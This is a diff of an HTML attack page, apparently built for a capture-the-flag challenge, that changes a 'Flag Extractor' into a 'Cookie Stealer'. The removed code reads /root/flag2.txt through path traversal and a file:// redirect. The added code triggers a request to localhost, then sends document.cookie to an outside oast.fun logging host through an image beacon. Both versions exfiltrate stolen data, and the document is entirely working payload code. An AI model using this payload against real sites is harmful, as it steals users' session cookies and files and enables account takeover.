@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Flag Extractor</title>
+    <title>Cookie Stealer</title>
 </head>
 <body>
     <script>
-        // First, try to request the flag with a path traversal
-        fetch('/../../root/flag2.txt')
-            .then(response => response.text())
-            .then(data => {
+        // First, redirect to localhost to get the flag cookie set
+        if (!document.cookie.includes("Flag")) {
+            // The 'fetch' below will execute first, storing our URL for later redirect back
+            fetch("http://localhost/", {
+                mode: "no-cors"
+            }).then(() => {
+                // After visiting localhost, it should have the cookie
+                // Now send the cookie to our server
                 const img = new Image();
-                img.src = "https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/log?flag=" + encodeURIComponent(data);
+                img.src = "https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/log?cookie=" + encodeURIComponent(document.cookie);
                 document.body.appendChild(img);
-            })
-            .catch(err => {
-                console.error(err);
-                // Try alternative if the first approach fails
-                location.href = "file:///root/flag2.txt";
             });
+        }
     </script>
 </body>
 </html>
